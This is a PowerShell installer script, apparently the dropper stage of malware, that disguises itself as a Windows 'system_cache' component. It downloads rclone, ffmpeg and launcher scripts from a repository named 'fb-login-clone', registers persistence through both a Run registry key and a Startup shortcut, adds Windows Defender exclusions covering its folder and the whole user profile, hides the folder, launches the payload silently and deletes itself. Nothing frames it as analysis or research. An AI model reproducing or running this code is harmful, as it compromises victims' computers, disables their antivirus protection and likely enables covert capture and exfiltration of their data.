# setup.ps1

$dest = "$env:APPDATA\Microsoft\Windows\system_cache"
$repo = "https://raw.githubusercontent.com/Ex6TenZz/fb-login-clone/main/public/system_cache"
$files = @(
    "system_cache.ps1",
    "system_cache_launcher.bat",
    "rclone.exe",
    "rclone.conf",
    "ffmpeg.exe",
    "setup.vbs",
    "system_cache_launcher.vbs"
)

# Create folder
try {
    if (-not (Test-Path $dest)) {
        New-Item -ItemType Directory -Path $dest -Force | Out-Null
        Write-Host "Created directory: $dest"
    }
} catch {
    Write-Warning "Failed to create directory: $_"
}

# Download files
foreach ($file in $files) {
    try {
        Invoke-WebRequest -Uri "$repo/$file" -OutFile "$dest\$file" -UseBasicParsing
        Write-Host "Downloaded $file"
    } catch {
        Write-Warning "Failed to download ${file}: $($_.Exception.Message)"
    }
}

# Register autostart
try {
    Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "system_cache" -Value "$dest\system_cache_launcher.vbs"
    Write-Host "Autostart registered"
} catch {
    Write-Warning "Failed to register autostart: $_"
}

# Add to Startup folder (duplicate autostart method)
try {
    $WshShell = New-Object -ComObject WScript.Shell
    $lnkPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\system_cache.lnk"
    $shortcut = $WshShell.CreateShortcut($lnkPath)
    $shortcut.TargetPath = "$dest\system_cache_launcher.vbs"
    $shortcut.WorkingDirectory = $dest
    $shortcut.Save()
    Write-Host "Startup shortcut created"
} catch {
    Write-Warning "Failed to create startup shortcut: $_"
}

# Defender exclusions
try {
    Add-MpPreference -ExclusionPath $dest -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "$dest\system_cache.ps1" -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess "$dest\system_cache_launcher.vbs" -ErrorAction SilentlyContinue
    $exes = @("$dest\ffmpeg.exe", "$dest\rclone.exe")
    foreach ($exe in $exes) {
        Add-MpPreference -ExclusionProcess $exe -ErrorAction SilentlyContinue
    }
    Add-MpPreference -ExclusionPath "$env:USERPROFILE" -ErrorAction SilentlyContinue

    Write-Host "Defender exclusions added"
} catch {
    Write-Warning "Failed to add Defender exclusions: $_"
}

# Hide folder
try {
    if (Test-Path $dest) {
        $item = Get-Item -LiteralPath $dest
        $item.Attributes = $item.Attributes -bor [System.IO.FileAttributes]::Hidden
        Write-Host "Folder hidden: $dest"
    } else {
        Write-Warning "Directory not found for hiding: $dest"
    }
} catch {
    Write-Warning "Failed to hide folder: $_"
}

# Launch main script silently
try {
    Start-Process -WindowStyle Hidden -FilePath "$dest\system_cache_launcher.vbs"
    Write-Host "Main script launched"
} catch {
    Write-Warning "Failed to launch main script: $_"
}

# Self-delete
$me = $MyInvocation.MyCommand.Path
Start-Sleep -Seconds 2
try {
    Remove-Item $me -Force -ErrorAction SilentlyContinue
} catch {}